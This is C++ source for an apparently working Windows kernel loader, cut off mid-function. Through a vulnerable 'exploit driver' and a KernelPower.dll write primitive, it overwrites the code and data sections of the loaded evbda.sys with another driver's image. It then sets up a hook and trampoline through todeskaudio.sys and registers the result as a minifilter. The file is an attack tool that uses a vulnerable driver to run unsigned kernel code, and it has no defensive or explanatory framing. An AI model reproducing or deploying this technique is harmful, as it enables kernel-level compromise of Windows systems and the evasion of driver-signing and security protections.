

#include <Windows.h>
#include <stdio.h>
#include "Kernel.h"
#include "MacroDef.h"
#include "LdrCtx.h"
#include "Log.h"
#include "HookCore.h"
#include "pe.h"
#undef SystemModuleInformation
#undef STATUS_INFO_LENGTH_MISMATCH
#undef STATUS_INSUFFICIENT_RESOURCES
#undef STATUS_NOT_FOUND
#undef STATUS_SUCCESS
#include "ntos.h"
#include <string>
#include "Helper.h"
#include "HookSave.h"
#include "KernelPower.h"

// Runtime config (read from hookconfig.ini)
static CHAR g_source_driver[MAX_PATH] = { 0 };
static CHAR g_exp_driver_name[MAX_PATH] = { 0 };
static DWORD g_hook_point_rva = 0;
static CHAR g_minifilter_altitude[64] = { 0 };

// KernelPower DLL handle
static HMODULE g_hKpDll = NULL;
static const KP_FUNC_TABLE* g_kpTable = NULL;

typedef const KP_FUNC_TABLE* (*FnKpGetTable)(void);
typedef BOOL(*FnKpInitialize)(void);

BOOL ReadConfig();
VOID DriverCheck();
BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize);

int main(int argc, char* argv[]) {
	volatile void* force_crt_strncpy = (void*)strncpy;
	volatile void* force_crt_strncat = (void*)strncat;

	LDRLogEtwInit();

	if (!ReadConfig()) {
		LDRLog(L"Failed to read config\n");
		return 1;
	}

	// Load KernelPower DLL
	WCHAR kp_path[MAX_PATH] = { 0 };
	Helper::ConvertCharToWchar("KernelPower.dll", kp_path, MAX_PATH);
	std::wstring kp_full = Helper::GetCurrentDirFilePath((TCHAR*)kp_path);
	g_hKpDll = LoadLibraryW(kp_full.c_str());
	if (!g_hKpDll) {
		LDRLog(L"Failed to load KernelPower.dll from %s (err=0x%x)\n", kp_full.c_str(), GetLastError());
		return 1;
	}

	FnKpGetTable pKpGetTable = (FnKpGetTable)GetProcAddress(g_hKpDll, "KpGetTable");
	FnKpInitialize pKpInitialize = (FnKpInitialize)GetProcAddress(g_hKpDll, "KpInitialize");
	if (!pKpGetTable || !pKpInitialize) {
		LDRLog(L"KernelPower.dll missing exports\n");
		FreeLibrary(g_hKpDll);
		return 1;
	}




	DriverCheck();

	// HookAndGo will call KpInitialize after obtaining the device handle
	if (!HookAndGo(pKpGetTable, pKpInitialize)) {
		LDRLog(L"hook failed\n");
		FreeLibrary(g_hKpDll);
		return 1;
	}
	LDRLog(L"Done\n");
	FreeLibrary(g_hKpDll);
	return 0;
}

BOOL ReadConfig() {
	CHAR config_path[MAX_PATH] = { 0 };
	{
		WCHAR w_config[MAX_PATH] = { 0 };
		Helper::ConvertCharToWchar(HOOK_CONFIG_FILE, w_config, MAX_PATH);
		std::wstring w_full = Helper::GetCurrentDirFilePath((TCHAR*)w_config);
		Helper::ConvertWcharToChar(w_full.c_str(), config_path, MAX_PATH);
	}

	GetPrivateProfileStringA("Hook", "SourceDriver", "", g_source_driver, MAX_PATH, config_path);
	GetPrivateProfileStringA("Hook", "ExpDriverName", "", g_exp_driver_name, MAX_PATH, config_path);
	CHAR rva_str[32] = { 0 };
	GetPrivateProfileStringA("Hook", "HookPointRVA", "", rva_str, 32, config_path);
	GetPrivateProfileStringA("Hook", "Altitude", "", g_minifilter_altitude, 64, config_path);

	if (rva_str[0]) {
		g_hook_point_rva = (DWORD)strtoul(rva_str, NULL, 16);
	}

	if (!g_source_driver[0]) {
		LDRLog(L"Missing config in %S. Required: SourceDriver\n", config_path);
		return FALSE;
	}
	if (!g_exp_driver_name[0]) {
		LDRLog(L"Missing config in %S. Required: ExpDriverName\n", config_path);
		return FALSE;
	}
	if (!g_hook_point_rva) {
		LDRLog(L"Missing config in %S. Required: HookPointRVA\n", config_path);
		return FALSE;
	}

	LDRLog(L"Config: SourceDriver=[%S] ExpDriverName=[%S] HookPointRVA=0x%x Altitude=[%S]\n",
		g_source_driver, g_exp_driver_name, g_hook_point_rva,
		g_minifilter_altitude[0] ? g_minifilter_altitude : "(none)");

	return TRUE;
}

static VOID EnsureDriverRunning(const char* driver_name, bool is_system_driver = false) {
	WCHAR w_name[MAX_PATH] = { 0 };
	Helper::ConvertCharToWchar(driver_name, w_name, MAX_PATH);

	// SCM service name is typically the driver name without .sys extension
	WCHAR w_svc_name[MAX_PATH] = { 0 };
	wcscpy_s(w_svc_name, w_name);
	WCHAR* dot = wcsrchr(w_svc_name, L'.');
	if (dot) *dot = L'\0';

	std::wstring drv_path;
	if (is_system_driver) {
		WCHAR sys_dir[MAX_PATH] = { 0 };
		GetSystemDirectoryW(sys_dir, MAX_PATH);
		drv_path = std::wstring(sys_dir) + L"\\drivers\\" + w_name;
	} else {
		drv_path = Helper::GetCurrentDirFilePath((TCHAR*)w_name);
	}

	if (GetFileAttributesW(drv_path.c_str()) == INVALID_FILE_ATTRIBUTES) {
		LDRLog(L"driver file not found: %s\n", drv_path.c_str());
		return;
	}

	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
	if (!scm) {
		LDRLog(L"OpenSCManagerW failed: 0x%x\n", GetLastError());
		return;
	}

	SC_HANDLE svc = OpenServiceW(scm, w_svc_name, SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG);
	if (!svc) {
		DWORD err = GetLastError();
		if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
			
				LDRLog(L"service [%S] not found, creating...\n", driver_name);
				Helper::InstallAndStartDriverService(w_svc_name, drv_path);
			
			CloseServiceHandle(scm);
			return;
		}
		// Retry with fewer rights if SERVICE_CHANGE_CONFIG caused access denial
		svc = OpenServiceW(scm, w_svc_name, SERVICE_QUERY_STATUS | SERVICE_START);
		if (!svc) {
			LDRLog(L"OpenServiceW failed for [%S]: 0x%x\n", driver_name, GetLastError());
			CloseServiceHandle(scm);
			return;
		}
	}

	// Only update binpath for non-system drivers
	if (!is_system_driver) {
		if (!ChangeServiceConfigW(
			svc,
			SERVICE_NO_CHANGE,          // dwServiceType
			SERVICE_NO_CHANGE,           // dwStartType
			SERVICE_NO_CHANGE,           // dwErrorControl
			drv_path.c_str(),            // lpBinaryPathName - update to our path
			NULL,                        // lpLoadOrderGroup
			NULL,                        // lpdwTagId
			NULL,                        // lpDependencies
			NULL,                        // lpServiceStartName
			NULL,                        // lpPassword
			NULL                         // lpDisplayName
		)) {
			LDRLog(L"ChangeServiceConfigW failed for [%S]: 0x%x (continuing with existing binpath)\n",
				driver_name, GetLastError());
		} else {
			LDRLog(L"Updated service [%S] binpath to: %s\n", driver_name, drv_path.c_str());
		}
	}

	SERVICE_STATUS status = { 0 };
	if (QueryServiceStatus(svc, &status)) {
		if (status.dwCurrentState != SERVICE_RUNNING) {
			LDRLog(L"service [%S] not running (state=%u), starting...\n", driver_name, status.dwCurrentState);
			if (!StartServiceW(svc, 0, NULL)) {
				DWORD startErr = GetLastError();
				if (startErr != ERROR_SERVICE_ALREADY_RUNNING) {
					LDRLog(L"StartServiceW failed for [%S]: 0x%x\n", driver_name, startErr);
				}
			}
			else {
				const int MAX_WAIT_MS = 10000;
				const int INTERVAL_MS = 200;
				int waited = 0;
				while (waited < MAX_WAIT_MS) {
					if (!QueryServiceStatus(svc, &status)) break;
					if (status.dwCurrentState == SERVICE_RUNNING) {
						LDRLog(L"service [%S] started successfully\n", driver_name);
						break;
					}
					Sleep(INTERVAL_MS);
					waited += INTERVAL_MS;
				}
			}
		}
		else {
			LDRLog(L"service [%S] already running\n", driver_name);
		}
	}

	CloseServiceHandle(svc);
	CloseServiceHandle(scm);
}

VOID DriverCheck() {
	EnsureDriverRunning(g_exp_driver_name);
	EnsureDriverRunning("todeskaudio.sys");
	EnsureDriverRunning(TRAMPOLINE_DRV_NAME, true);

	// If SourceDriver is a minifilter, FltRegisterFilter looks up Altitude from
	// the trampoline driver's (evbda) registry key. We need to write the
	// minifilter Instance subkey so FltMgr can find it.
	if (g_minifilter_altitude[0]) {
		CHAR svc_name[MAX_PATH] = { 0 };
		strncpy_s(svc_name, TRAMPOLINE_DRV_NAME, MAX_PATH);
		CHAR* dot = strrchr(svc_name, '.');
		if (dot) *dot = '\0';

		CHAR reg_path[MAX_PATH] = { 0 };
		sprintf_s(reg_path, MAX_PATH, "SYSTEM\\CurrentControlSet\\Services\\%s", svc_name);

		HKEY hKey = NULL;
		LSTATUS err = RegOpenKeyExA(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_WRITE, &hKey);
		if (err != ERROR_SUCCESS) {
			LDRLog(L"Failed to open registry [%S] for minifilter Altitude write: 0x%x\n", reg_path, err);
			return;
		}

		// Write SupportedFeatures = 0x3
		DWORD supportedFeatures = 0x3;
		RegSetValueExA(hKey, "SupportedFeatures", 0, REG_DWORD, (BYTE*)&supportedFeatures, sizeof(DWORD));

		// Create Instances subkey and set default instance name as its default value
		CHAR default_instance[128] = { 0 };
		sprintf_s(default_instance, 128, "%s Instance", svc_name);
		HKEY hInstancesKey = NULL;
		err = RegCreateKeyExA(hKey, "Instances", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hInstancesKey, NULL);
		if (err == ERROR_SUCCESS) {
			RegSetValueExA(hInstancesKey, NULL, 0, REG_SZ, (BYTE*)default_instance, (DWORD)strlen(default_instance) + 1);
			// FltMgr queries value named "DEFAULTINSTANCE" (not default value) under Instances key
			RegSetValueExA(hInstancesKey, "DEFAULTINSTANCE", 0, REG_SZ, (BYTE*)default_instance, (DWORD)strlen(default_instance) + 1);
			RegCloseKey(hInstancesKey);
		} else {
			LDRLog(L"Failed to create Instances subkey for [%S]: 0x%x\n", svc_name, err);
		}

		// Create Instances\<DefaultInstance> subkey
		HKEY hInstKey = NULL;
		CHAR inst_path[MAX_PATH] = { 0 };
		sprintf_s(inst_path, MAX_PATH, "Instances\\%s", default_instance);
		err = RegCreateKeyExA(hKey, inst_path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hInstKey, NULL);
		if (err == ERROR_SUCCESS) {
			RegSetValueExA(hInstKey, "Altitude", 0, REG_SZ, (BYTE*)g_minifilter_altitude, (DWORD)strlen(g_minifilter_altitude) + 1);
			DWORD flags = 0x0;
			RegSetValueExA(hInstKey, "Flags", 0, REG_DWORD, (BYTE*)&flags, sizeof(DWORD));
			RegCloseKey(hInstKey);
			LDRLog(L"Wrote minifilter registry: Altitude=[%S] for [%S]\n", g_minifilter_altitude, svc_name);
		} else {
			LDRLog(L"Failed to create Instance subkey for [%S]: 0x%x\n", svc_name, err);
		}

		RegCloseKey(hKey);
	}
}

BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
	// Snapshot all config values into locals at entry, so globals can't be corrupted later
	CHAR loc_source_driver[MAX_PATH];

	strncpy_s(loc_source_driver, g_source_driver, MAX_PATH);

	DWORD64 hook_code_addr = 0;

	LDRLog(L"HookAndGo: source=[%S]\n", loc_source_driver);

	// Prepare disk paths for trampoline and source drivers
	CHAR evbda_sys_path[MAX_PATH] = { 0 };
	{
		// evbda.sys lives in System32drivers, not the current directory
		WCHAR sys_dir[MAX_PATH] = { 0 };
		GetSystemDirectoryW(sys_dir, MAX_PATH);
		WCHAR w_evbda[MAX_PATH] = { 0 };
		Helper::ConvertCharToWchar(TRAMPOLINE_DRV_NAME, w_evbda, MAX_PATH);
		std::wstring evbda_path = std::wstring(sys_dir) + L"\\drivers\\" + w_evbda;
		Helper::ConvertWcharToChar(evbda_path.c_str(), evbda_sys_path, MAX_PATH);
	}

	CHAR source_sys_path[MAX_PATH] = { 0 };
	{
		WCHAR w_src[MAX_PATH] = { 0 };
		Helper::ConvertCharToWchar(loc_source_driver, w_src, MAX_PATH);
		std::wstring src_path = Helper::GetCurrentDirFilePath((TCHAR*)w_src);
		Helper::ConvertWcharToChar(src_path.c_str(), source_sys_path, MAX_PATH);
	}

	// Step 1: Check evbda.sys size_of_code must >= source driver size_of_code
	LDRLog(L"evbda_sys_path=[%S] source_sys_path=[%S]\n", evbda_sys_path, source_sys_path);
	PEInfo evbda_pe = { 0 };
	PE_GetPEInfo(evbda_sys_path, &evbda_pe);

	PEInfo source_pe = { 0 };
	PE_GetPEInfo(source_sys_path, &source_pe);

	LDRLog(L"size_of_code check: evbda=%u source=%u\n", evbda_pe.size_of_code, source_pe.size_of_code);

	if (evbda_pe.size_of_code < source_pe.size_of_code) {
		LDRLog(L"evbda.sys size_of_code (%u) < source driver size_of_code (%u), aborting\n",
			evbda_pe.size_of_code, source_pe.size_of_code);
		return FALSE;
	}

	// Get evbda.sys section list for bounds checking (used in Step 2)
	PESectionInfo evbda_sections[32] = { 0 };
	DWORD evbda_section_count = PE_GetSectionList(evbda_sys_path, evbda_sections, 32);
	if (evbda_section_count == 0) {
		LDRLog(L"failed to get evbda.sys section list\n");
		return FALSE;
	}
	LDRLog(L"evbda.sys has %u sections\n", evbda_section_count);

	// Initialize KernelPower DLL (opens driver internally)
	if (!pKpInitialize()) {
		LDRLog(L"KpInitialize failed\n");
		return FALSE;
	}

	g_kpTable = pKpGetTable();
	LdrCtx_SetKpTable(g_kpTable);


	// Get ntoskrnl base
	PVOID krnl_base = NULL;
	NTSTATUS st = KRNL::GetDriverBase(NTKRNL_NAME, &krnl_base);
	if (0 != st) {
		LDRLog(L"failed to call GetDriverBase for ntoskrnl, Status=0x%x\n", st);
		return FALSE;
	}
	LdrCtx_SetKrnlBase(krnl_base);
	LDRLog(L"ntoskrnl base=0x%p\n", krnl_base);

	// Resolve nt!DbgPrompt address (used as PIT relay when distance > 4GB)
	DWORD dbg_prompt_offset = 0;
	if (!PE_GetExportOffset("C:\\Windows\\System32\\ntoskrnl.exe", DBG_EXPORT_FUNC, &dbg_prompt_offset)) {
		LDRLog(L"failed to find DbgPrompt export in ntoskrnl.exe\n");
	}
	else {
		LdrCtx_SetDbgPromptAbsAddr((PVOID)((DWORD64)krnl_base + dbg_prompt_offset));
		LDRLog(L"DbgPrompt addr=0x%p (ntoskrnl base + 0x%x)\n", LdrCtx_GetDbgPromptAbsAddr(), dbg_prompt_offset);
	}

	// Get exploit driver base
	PVOID exp_base = NULL;
	st = KRNL::GetDriverBase(g_exp_driver_name, &exp_base);
	if (0 != st) {
		LDRLog(L"failed to get exploit driver base, Status=0x%x\n", st);
		return FALSE;
	}
	LdrCtx_SetExpDrvBase(exp_base);
	LDRLog(L"exploit driver base=0x%p\n", exp_base);


		// Restore exploit driver original bytes at hook point from hook.save (if exists)
		{
			CHAR save_path[MAX_PATH] = { 0 };
			{
				WCHAR w_save[MAX_PATH] = { 0 };
				Helper::ConvertCharToWchar(HOOKSAVE_FILE, w_save, MAX_PATH);
				std::wstring w_full = Helper::GetCurrentDirFilePath((TCHAR*)w_save);
				Helper::ConvertWcharToChar(w_full.c_str(), save_path, MAX_PATH);
			}
			HANDLE hf = CreateFileA(save_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hf != INVALID_HANDLE_VALUE) {
				DWORD save_byte_count = 0;
				DWORD read_bytes = 0;
				BOOL ok = ReadFile(hf, &save_byte_count, sizeof(DWORD), &read_bytes, NULL) && read_bytes == sizeof(DWORD);
				if (ok && save_byte_count > 0 && save_byte_count <= 256) {
					UCHAR* save_buf = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, save_byte_count);
					ok = ReadFile(hf, save_buf, save_byte_count, &read_bytes, NULL) && read_bytes == save_byte_count;
					if (ok) {
						PVOID restore_addr = (PVOID)((DWORD64)exp_base + g_hook_point_rva);
						if (!g_kpTable->WritePrimitive(restore_addr, save_buf, save_byte_count)) {
							LDRLog(L"failed to restore exploit driver at 0x%p\n", restore_addr);

						} else {
							LDRLog(L"restored exploit driver %u bytes at 0x%p (offset=0x%x)\n", save_byte_count, restore_addr, g_hook_point_rva);

						}
					}
					HeapFree(GetProcessHeap(), 0, save_buf);
				} else {
					LDRLog(L"hook.save invalid or empty, skipping restore\n");

				}
				CloseHandle(hf);
			} else {
				LDRLog(L"no hook.save found, skipping restore\n");

			}
		}

	// Get trampoline driver base (todeskaudio.sys)
	PVOID tramp_base = NULL;
	st = KRNL::GetDriverBase("todeskaudio.sys", &tramp_base);
	if (0 != st) {
		LDRLog(L"failed to get trampoline driver [todeskaudio.sys] base, Status=0x%x\n", st);
		return FALSE;
	}
	LdrCtx_SetTrampolineDrvBase(tramp_base);
	LDRLog(L"trampoline driver (todeskaudio.sys) base=0x%p\n", tramp_base);

	// Get evbda.sys kernel base (big driver for code map)
	PVOID evbda_base = NULL;
	st = KRNL::GetDriverBase(TRAMPOLINE_DRV_NAME, &evbda_base);
	if (0 != st) {
		LDRLog(L"failed to get evbda.sys base, Status=0x%x\n", st);
		return FALSE;
	}
	LDRLog(L"evbda.sys base=0x%p\n", evbda_base);

	// Step 1.5: Scan evbda.sys entry point to find DriverEntry and key memory pointer
	DWORD64 evbda_mem_value = 0;
	{
		PVOID driver_entry = NULL;
		PVOID mem_ptr = NULL;
		if (!PE_ScanEntryToDriverEntry(
			(ULONG_PTR)evbda_base, evbda_pe.entry,
			&driver_entry, &mem_ptr, &evbda_mem_value)) {
			LDRLog(L"failed to scan evbda.sys entry point\n");
		} else {
			LDRLog(L"DriverEntry=0x%p mem_ptr=0x%p mem_value=0x%llX\n",
				driver_entry, mem_ptr, evbda_mem_value);
		}
	}

	DWORD evbda_base_of_code = 0; // needed for Step 2 and trampoline offsets
		// Step 2: Map source driver into user memory, then write its code section into evbda.sys base of code
		{
		// Get BaseOfCode offsets from disk PE files (needed before mapping for relocation target)
		std::wstring w_evbda_sys_path(evbda_sys_path, evbda_sys_path + strlen(evbda_sys_path));
			// DWORD evbda_base_of_code = 0; // moved outside block
		if (!PE_GetCodeSectionStartOffset(w_evbda_sys_path, evbda_base_of_code)) {
			LDRLog(L"failed to get evbda.sys BaseOfCode\n");
			return FALSE;
		}

		std::wstring w_source_sys_path(source_sys_path, source_sys_path + strlen(source_sys_path));
		DWORD source_base_of_code = 0;
		if (!PE_GetCodeSectionStartOffset(w_source_sys_path, source_base_of_code)) {
			LDRLog(L"failed to get source driver BaseOfCode\n");
			return FALSE;
		}

		// Target kernel address: evbda.sys base + base_of_code (where source code will actually run)
		DWORD64 target_kernel_addr = (DWORD64)evbda_base + evbda_base_of_code;
		LDRLog(L"BaseOfCode: source=0x%x evbda=0x%x size_of_code=%u target_kernel_addr=0x%llX\n",
			source_base_of_code, evbda_base_of_code, source_pe.size_of_code, target_kernel_addr);

		HMODULE mapped_source = NULL;
		if (!PE_MapAndResolve(source_sys_path, target_kernel_addr, &mapped_source)) {
			LDRLog(L"failed to map source driver [%S] into memory\n", loc_source_driver);
			return FALSE;
		}
		LDRLog(L"source driver mapped at 0x%p\n", mapped_source);

		// Source code bytes: from mapped image at base_of_code
		UCHAR* source_code = (UCHAR*)mapped_source + source_base_of_code;

		// Destination in kernel: target_kernel_addr + source_base_of_code
		// (relocations use target_kernel_addr as PE base, so code must be at target_kernel_addr + source_base_of_code)
		PVOID krnl_write_addr = (PVOID)((DWORD64)target_kernel_addr + source_base_of_code);

		if (!g_kpTable->WritePrimitive(krnl_write_addr, source_code, source_pe.size_of_code)) {
			LDRLog(L"failed to write source driver code into evbda.sys base of code\n");
			return FALSE;
		}
		LDRLog(L"wrote source driver code (0x%x bytes) into evbda.sys at 0x%p\n",
			source_pe.size_of_code, krnl_write_addr);

			// Write source driver IAT into evbda.sys kernel space
			// SourceDriver code uses ff25 jmp [rip+disp] to call imports via IAT.
			// These indirect calls target target_kernel_addr + IAT_entry_rva in kernel.
			// We must write the resolved IAT (kernel absolute addresses) there,
			// otherwise the code will jump into evbda's own IAT (wrong imports).
			{
				PIMAGE_NT_HEADERS nt_iat = RtlImageNtHeader((PVOID)mapped_source);
				if (nt_iat && nt_iat->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IAT) {
					DWORD iat_rva = nt_iat->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress;
					DWORD iat_size = nt_iat->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
					if (iat_rva != 0 && iat_size > 0) {
						DWORD iat_offset_in_evbda = evbda_base_of_code + iat_rva;
						BOOL found_iat_section = FALSE;
						for (DWORD j = 0; j < evbda_section_count; j++) {
							DWORD sec_end = evbda_sections[j].rva + evbda_sections[j].virtual_size;
							if (iat_offset_in_evbda >= evbda_sections[j].rva &&
								iat_offset_in_evbda + iat_size <= sec_end) {
								found_iat_section = TRUE;
								break;
							}
						}
						if (!found_iat_section) {
							LDRLog(L"abort: evbda.sys has no section covering IAT at offset 0x%x (iat_rva=0x%x, iat_size=0x%x)\n",
								iat_offset_in_evbda, iat_rva, iat_size);
							free(mapped_source);
							return FALSE;
						}
						PVOID iat_data = (PVOID)((ULONG_PTR)mapped_source + iat_rva);
						PVOID krnl_iat_addr = (PVOID)(target_kernel_addr + iat_rva);
						if (!g_kpTable->WritePrimitive(krnl_iat_addr, iat_data, iat_size)) {
							LDRLog(L"failed to write source driver IAT into evbda.sys at 0x%p\n", krnl_iat_addr);
						} else {
							LDRLog(L"wrote source driver IAT (0x%x bytes) into evbda.sys at 0x%p\n", iat_size, krnl_iat_addr);
						}
					}
				}
			}

			// Write source driver non-code sections into evbda.sys kernel space
				{
					PIMAGE_NT_HEADERS nt = RtlImageNtHeader((PVOID)mapped_source);
					if (nt) {
						DWORD num_sections = nt->FileHeader.NumberOfSections;
						PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
						for (DWORD i = 0; i < num_sections; i++, sec++) {
							// Skip code section (already written) and reloc section
							if (sec->Characteristics & IMAGE_SCN_CNT_CODE)
								continue;
							if (sec->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
								continue;
							DWORD sec_rva = sec->VirtualAddress;
							DWORD sec_vsize = sec->Misc.VirtualSize;
							if (sec_rva == 0 || sec_vsize == 0)
								continue;
							// Also skip IAT range (already written above)
							if (nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IAT) {
								DWORD iat_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress;
								DWORD iat_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
								if (sec_rva == iat_rva && sec_vsize == iat_size)
									continue;
							}

							if (sec->Characteristics & IMAGE_SCN_MEM_WRITE) {
								// Writable section (.data etc): write into evbda's writable section
								// Find evbda's first writable section with enough space
								DWORD64 data_actual_addr = 0;
								BOOL found_writable = FALSE;
								for (DWORD j = 0; j < evbda_section_count; j++) {
									if (!(evbda_sections[j].characteristics & IMAGE_SCN_MEM_WRITE))
										continue;
									if (evbda_sections[j].virtual_size >= sec_vsize) {
										data_actual_addr = (DWORD64)evbda_base + evbda_sections[j].rva;
										LDRLog(L"source [%S] -> evbda writable section [%S] at 0x%llX (rva=0x%x, vsize=0x%x)\n",
											(CHAR*)sec->Name, evbda_sections[j].name, data_actual_addr,
											evbda_sections[j].rva, evbda_sections[j].virtual_size);
										found_writable = TRUE;
										break;
									}
								}
								if (!found_writable) {
									LDRLog(L"abort: evbda.sys has no writable section large enough for [%S] (0x%x bytes)\n",
										(CHAR*)sec->Name, sec_vsize);
									free(mapped_source);
									return FALSE;
								}

								PVOID sec_data = (PVOID)((ULONG_PTR)mapped_source + sec_rva);
								if (!g_kpTable->WritePrimitive((PVOID)data_actual_addr, sec_data, sec_vsize)) {
									LDRLog(L"failed to write source driver section [%S] into evbda writable section at 0x%llX\n",
										(CHAR*)sec->Name, data_actual_addr);
								} else {
									LDRLog(L"wrote source driver section [%S] (0x%x bytes) into evbda writable section at 0x%llX\n",
										(CHAR*)sec->Name, sec_vsize, data_actual_addr);
								}

								// Fix code references: relocations in code currently point to
								// target_kernel_addr + sec_rva (the .text-based address).
								// Adjust them to point to data_actual_addr instead.
								DWORD64 old_data_addr = target_kernel_addr + sec_rva;
								PE_FixRemappedSectionRefs((ULONG_PTR)mapped_source, target_kernel_addr,
										source_base_of_code, source_pe.size_of_code,
										old_data_addr, sec_vsize, data_actual_addr);
							} else {
								// Read-only section (.rdata, .pdata, etc): write at target_kernel_addr + sec_rva
								DWORD target_offset_in_evbda = evbda_base_of_code + sec_rva;
								BOOL found_section = FALSE;
								for (DWORD j = 0; j < evbda_section_count; j++) {
									DWORD sec_end = evbda_sections[j].rva + evbda_sections[j].virtual_size;
									if (target_offset_in_evbda >= evbda_sections[j].rva &&
										target_offset_in_evbda + sec_vsize <= sec_end) {
										found_section = TRUE;
										break;
									}
								}
								if (!found_section) {
									LDRLog(L"abort: evbda.sys has no section covering offset 0x%x (source section [%S] at rva=0x%x, vsize=0x%x)\n",
										target_offset_in_evbda, (CHAR*)sec->Name, sec_rva, sec_vsize);
									free(mapped_source);
									return FALSE;
								}

								PVOID sec_data = (PVOID)((ULONG_PTR)mapped_source + sec_rva);
								PVOID krnl_sec_addr = (PVOID)(target_kernel_addr + sec_rva);
								if (!g_kpTable->WritePrimitive(krnl_sec_addr, sec_data, sec_vsize)) {
									LDRLog(L"failed to write source driver section [%S] into evbda.sys at 0x%p\n", (CHAR*)sec->Name, krnl_sec_addr);
								} else {
									LDRLog(L"wrote source driver section [%S] (0x%x bytes) into evbda.sys at 0x%p\n", (CHAR*)sec->Name, sec_vsize, krnl_sec_addr);
								}
							}
						}
					}
				}


			
				// Rewrite source driver code and read-only sections to kernel
				// (relocations may have changed due to writable section remapping above)
				if (!g_kpTable->WritePrimitive(krnl_write_addr, source_code, source_pe.size_of_code)) {
					LDRLog(L"failed to rewrite source driver code after section remap\n");
					free(mapped_source);
					return FALSE;
				}
				LDRLog(L"rewrote source driver code (0x%x bytes) after section remap\n", source_pe.size_of_code);
				// Also rewrite read-only sections that may contain remapped addresses
				{
					PIMAGE_NT_HEADERS nt2 = RtlImageNtHeader((PVOID)mapped_source);
					if (nt2) {
						DWORD ns = nt2->FileHeader.NumberOfSections;
						PIMAGE_SECTION_HEADER sec2 = IMAGE_FIRST_SECTION(nt2);
						for (DWORD i = 0; i < ns; i++, sec2++) {
							if (sec2->Characteristics & IMAGE_SCN_CNT_CODE)
								continue;
							if (sec2->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
								continue;
							if (sec2->Characteristics & IMAGE_SCN_MEM_WRITE)
								continue;
							DWORD sr = sec2->VirtualAddress;
							DWORD sv = sec2->Misc.VirtualSize;
							if (sr == 0 || sv == 0) continue;
							PVOID sd = (PVOID)((ULONG_PTR)mapped_source + sr);
							PVOID ka = (PVOID)(target_kernel_addr + sr);
							g_kpTable->WritePrimitive(ka, sd, sv);
						}
					}
				}

// Scan source driver entry point for the 2nd CALL instruction target (hook_code_addr)
		{
			PEInfo source_pe_scan = { 0 };
			PE_GetPEInfo(source_sys_path, &source_pe_scan);
			if (!PE_ScanEntryFindSecondCall(
				(ULONG_PTR)mapped_source, source_pe_scan.entry,
				target_kernel_addr, &hook_code_addr)) {
				LDRLog(L"failed to find 2nd CALL in source driver entry point\n");
				free(mapped_source);
				return FALSE;
			}
			LDRLog(L"hook_code_addr=0x%llX (from 2nd CALL in source driver entry)\n", hook_code_addr);
		}

			free(mapped_source);

	}
	// Target is exploit driver itself
	PVOID target_base = exp_base;
	LdrCtx_SetTargetDrvBase(target_base);
	LDRLog(L"target (exploit driver) base=0x%p\n", target_base);

	
	
	// Resolve stage_1 and stage_2 offsets in todeskaudio.sys
	DWORD todesk_base_of_code = 0;
	{
		std::wstring w_todesk_path(MAX_PATH, L'\0');
		CHAR todesk_sys_path[MAX_PATH] = { 0 };
		WCHAR w_todesk[MAX_PATH] = { 0 };
		Helper::ConvertCharToWchar("todeskaudio.sys", w_todesk, MAX_PATH);
		std::wstring todesk_path = Helper::GetCurrentDirFilePath((TCHAR*)w_todesk);
		Helper::ConvertWcharToChar(todesk_path.c_str(), todesk_sys_path, MAX_PATH);
		std::wstring w_path(todesk_sys_path, todesk_sys_path + strlen(todesk_sys_path));
		if (!PE_GetCodeSectionStartOffset(w_path, todesk_base_of_code)) {
			LDRLog(L"failed to get todeskaudio.sys BaseOfCode, path=[%S]\n", todesk_sys_path);
			return FALSE;
		}
		LDRLog(L"todeskaudio.sys BaseOfCode=0x%x, path=[%S]\n", todesk_base_of_code, todesk_sys_path);
	}
	DWORD stage_1_func_offset = todesk_base_of_code;
	DWORD stage_2_func_offset = todesk_base_of_code + 0x1000;
	LDRLog(L"stage_1 offset=0x%x (todesk BaseOfCode), stage_2 offset=0x%x (todesk BaseOfCode+0x1000)\n",
		stage_1_func_offset, stage_2_func_offset);


	// oriAsmAddr: where original instructions are saved (inside stage_2 + OFFSET_FOR_ORIGINAL_ASM_CODE_SAVE)
	DWORD64 ori_asm_code_addr = (DWORD64)tramp_base + stage_2_func_offset + OFFSET_FOR_ORIGINAL_ASM_CODE_SAVE;
	LDRLog(L"ori_asm_code_addr=0x%llX\n", ori_asm_code_addr);

	// Hook point: opcode 8 branch in exploit driver
	PVOID hook_point = (LPVOID)((DWORD64)target_base + g_hook_point_rva);
	LDRLog(L"hook point=0x%p (exp_base + 0x%x)\n", hook_point, g_hook_point_rva);

	// Calculate trampoline_addr: the address that PIT points to
	// Skip stage_0 (xor eax,eax; ret = 3 bytes) and placeholder (8 bytes) to reach shellcode
	DWORD64 trampoline_addr = (DWORD64)tramp_base + stage_1_func_offset + stage_0_xoreaxeaxret_size + stage_0_placeholder_size;
	LDRLog(L"trampoline_addr=0x%llX\n", trampoline_addr);

	// Distance check: can ff25 rel32 reach the PIT from hook_point?
	DWORD64 next_rip = (DWORD64)hook_point + ff25jmpsize;
